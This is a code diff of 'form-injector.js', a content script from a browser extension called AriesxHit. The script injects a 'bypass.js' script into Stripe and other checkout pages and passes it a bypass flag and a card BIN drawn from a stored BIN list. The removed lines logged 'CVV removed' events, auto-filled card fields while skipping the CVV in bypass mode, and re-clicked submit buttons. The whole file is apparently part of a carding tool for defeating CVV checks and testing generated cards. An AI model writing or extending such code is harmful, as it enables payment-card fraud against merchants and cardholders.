@@ -1,265 +1,126 @@
 // ===================================
 // FORM-INJECTOR.JS
-// Injects bypass.js into page context
-// Location: scripts/content/form-injector.js
+// Injects bypass script into page context
+// Relays messages between page and background
 // ===================================
 
 (function() {
-  'use strict';
+  if (window.__ARIESXHIT_INJECTOR__) return;
+  window.__ARIESXHIT_INJECTOR__ = true;
 
-  console.log('[AriesxHit] Form injector loaded');
+  // State
+  let bypassEnabled = false;
+  let currentBin = '';
+  let settings = {};
 
   // ==================== INJECT BYPASS SCRIPT ====================
 
   function injectBypassScript() {
     const script = document.createElement('script');
     script.src = chrome.runtime.getURL('scripts/core/bypass.js');
-    script.onload = function() {
+    script.onload = () => {
       console.log('[AriesxHit] Bypass script injected');
-      this.remove();
+      // Send initial state after injection
+      setTimeout(sendStateToPage, 100);
     };
-    script.onerror = function() {
-      console.error('[AriesxHit] Failed to inject bypass script');
-      this.remove();
-    };
-
     (document.head || document.documentElement).appendChild(script);
   }
 
-  // Inject immediately
-  injectBypassScript();
+  // ==================== SEND STATE TO PAGE ====================
 
-  // ==================== MESSAGE HANDLING ====================
+  function sendStateToPage() {
+    window.postMessage({
+      source: 'ariesxhit-settings',
+      type: 'UPDATE_STATE',
+      bypassEnabled: bypassEnabled,
+      bin: currentBin,
+      settings: settings
+    }, '*');
+  }
 
-  // Listen for messages from page context (bypass.js)
+  // ==================== LISTEN FOR LOGS FROM PAGE ====================
+
   window.addEventListener('message', (event) => {
-    if (event.data?.source === 'ariesxhit-bypass') {
-      
-      // CVV was removed
-      if (event.data.type === 'cvv_removed') {
-        console.log('[AriesxHit] CVV removed:', event.data.url);
-        
-        // Notify background script
-        chrome.runtime.sendMessage({
-          type: 'BYPASS_EVENT',
-          data: {
-            url: event.data.url,
-            method: event.data.method,
-            count: event.data.count
-          }
-        }).catch(() => {
-          // Extension context invalidated, ignore
-        });
-      }
-
-      // Bypass state changed
-      if (event.data.type === 'state_changed') {
-        console.log('[AriesxHit] Bypass state:', event.data.active ? 'ACTIVE' : 'INACTIVE');
-      }
+    if (event.data?.source !== 'ariesxhit-bypass') return;
+    
+    if (event.data.type === 'LOG') {
+      // Send to background for logging
+      chrome.runtime.sendMessage({
+        type: 'ADD_LOG_ENTRY',
+        logType: event.data.logType,
+        message: event.data.message
+      }).catch(() => {});
     }
   });
 
-  // Listen for messages from background script
-  chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
-    
-    // Toggle bypass state
-    if (message.type === 'SET_BYPASS_STATE') {
-      console.log('[AriesxHit] Setting bypass state:', message.active);
-      
-      // Send to page context (bypass.js)
-      window.postMessage({
-        source: 'ariesxhit-bypass-control',
-        active: message.active
-      }, '*');
+  // ==================== LISTEN FOR MESSAGES FROM BACKGROUND ====================
 
+  chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
+    if (message.type === 'SET_BYPASS_STATE') {
+      bypassEnabled = message.active;
+      currentBin = message.bin || currentBin;
+      settings = message.settings || settings;
+      sendStateToPage();
+      sendResponse({ success: true });
+    }
+    
+    if (message.type === 'UPDATE_BIN') {
+      currentBin = message.bin;
+      sendStateToPage();
       sendResponse({ success: true });
     }
 
-    // Get bypass stats
-    if (message.type === 'GET_BYPASS_STATS') {
-      // Request stats from page context
-      window.postMessage({
-        source: 'ariesxhit-bypass-control',
-        action: 'get_stats'
-      }, '*');
-      
+    if (message.type === 'UPDATE_SETTINGS') {
+      settings = message.settings;
+      sendStateToPage();
       sendResponse({ success: true });
     }
 
     return true;
   });
 
-  // ==================== AUTO-FILL FORMS ====================
+  // ==================== LOAD INITIAL STATE ====================
 
-  /**
-   * Auto-fill card form with provided data
-   */
-  function autoFillCard(cardData) {
-    console.log('[AriesxHit] Auto-filling card data');
+  async function loadInitialState() {
+    try {
+      // Get bypass state
+      const bypassState = await chrome.runtime.sendMessage({ type: 'GET_BYPASS_STATE' });
+      bypassEnabled = bypassState?.active || false;
 
-    // Common Stripe field selectors
-    const selectors = {
-      cardNumber: [
-        'input[name="cardnumber"]',
-        'input[name="card_number"]',
-        'input[placeholder*="Card number"]',
-        'input[placeholder*="card number"]',
-        '#card-number',
-        '.card-number'
-      ],
-      expMonth: [
-        'input[name="exp_month"]',
-        'input[name="exp-month"]',
-        'input[placeholder*="MM"]',
-        'select[name="exp_month"]'
-      ],
-      expYear: [
-        'input[name="exp_year"]',
-        'input[name="exp-year"]',
-        'input[placeholder*="YY"]',
-        'select[name="exp_year"]'
-      ],
-      cvv: [
-        'input[name="cvc"]',
-        'input[name="cvv"]',
-        'input[placeholder*="CVC"]',
-        'input[placeholder*="CVV"]',
-        '#cvc',
-        '.cvc'
-      ]
-    };
+      // Get settings
+      const settingsResponse = await chrome.runtime.sendMessage({ type: 'GET_SETTINGS' });
+      settings = settingsResponse?.settings || {};
 
-    // Try to find and fill fields
-    for (const selector of selectors.cardNumber) {
-      const field = document.querySelector(selector);
-      if (field) {
-        setFieldValue(field, cardData.number);
-        break;
+      // Get BIN
+      const storage = await chrome.storage.local.get(['binList', 'current_bin']);
+      if (storage.binList?.length > 0) {
+        currentBin = storage.binList[0];
+      } else if (storage.current_bin) {
+        currentBin = storage.current_bin;
       }
-    }
 
-    for (const selector of selectors.expMonth) {
-      const field = document.querySelector(selector);
-      if (field) {
-        setFieldValue(field, cardData.month);
-        break;
-      }
-    }
-
-    for (const selector of selectors.expYear) {
-      const field = document.querySelector(selector);
-      if (field) {
-        setFieldValue(field, cardData.year);
-        break;
-      }
-    }
-
-    // Only fill CVV if not in bypass mode
-    if (!cardData.bypassMode) {
-      for (const selector of selectors.cvv) {
-        const field = document.querySelector(selector);
-        if (field) {
-          setFieldValue(field, cardData.cvv);
-          break;
-        }
-      }
+      sendStateToPage();
+    } catch (e) {
+      console.log('[AriesxHit] Error loading initial state:', e);
     }
   }
 
-  /**
-   * Set field value and trigger events
-   */
-  function setFieldValue(field, value) {
-    if (!field) return;
+  // ==================== INIT ====================
 
-    // Set value
-    field.value = value;
-
-    // Trigger events
-    field.dispatchEvent(new Event('input', { bubbles: true }));
-    field.dispatchEvent(new Event('change', { bubbles: true }));
-    field.dispatchEvent(new Event('blur', { bubbles: true }));
-
-    // For React/Vue
-    const nativeInputValueSetter = Object.getOwnPropertyDescriptor(
-      window.HTMLInputElement.prototype,
-      'value'
-    ).set;
-    nativeInputValueSetter.call(field, value);
-    
-    const event = new Event('input', { bubbles: true });
-    field.dispatchEvent(event);
-  }
-
-  // Listen for auto-fill requests
-  chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
-    if (message.type === 'AUTO_FILL_CARD') {
-      autoFillCard(message.cardData);
-      sendResponse({ success: true });
-    }
-  });
-
-  // ==================== RETRY LOGIC ====================
-
-  /**
-   * Click submit button to retry
-   */
-  function clickSubmitButton(selector) {
-    let button;
-
-    if (selector) {
-      // Try custom selector
-      if (selector.startsWith('/')) {
-        // XPath
-        const result = document.evaluate(
-          selector,
-          document,
-          null,
-          XPathResult.FIRST_ORDERED_NODE_TYPE,
-          null
-        );
-        button = result.singleNodeValue;
-      } else {
-        // CSS selector
-        button = document.querySelector(selector);
-      }
-    }
-
-    // Fallback to common selectors
-    if (!button) {
-      const commonSelectors = [
-        '.SubmitButton',
-        '.CheckoutButton',
-        'button[type="submit"]',
-        '[class*="submit"]',
-        '[class*="Submit"]',
-        '[id*="submit"]'
-      ];
-
-      for (const sel of commonSelectors) {
-        button = document.querySelector(sel);
-        if (button) break;
-      }
-    }
-
-    if (button) {
-      console.log('[AriesxHit] Clicking submit button');
-      button.click();
-      return true;
-    } else {
-      console.error('[AriesxHit] Submit button not found');
-      return false;
+  function init() {
+    // Only run on potential checkout pages
+    const url = window.location.href;
+    if (url.includes('stripe.com') || url.includes('checkout') || url.includes('payment') || url.includes('cs_live') || url.includes('buy.stripe')) {
+      injectBypassScript();
+      loadInitialState();
     }
   }
 
-  // Listen for retry requests
-  chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
-    if (message.type === 'CLICK_SUBMIT') {
-      const success = clickSubmitButton(message.selector);
-      sendResponse({ success: success });
-    }
-  });
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', init);
+  } else {
+    init();
+  }
 
-  console.log('[AriesxHit] Form injector ready');
-
+  console.log('[AriesxHit] Form injector loaded');
 })();
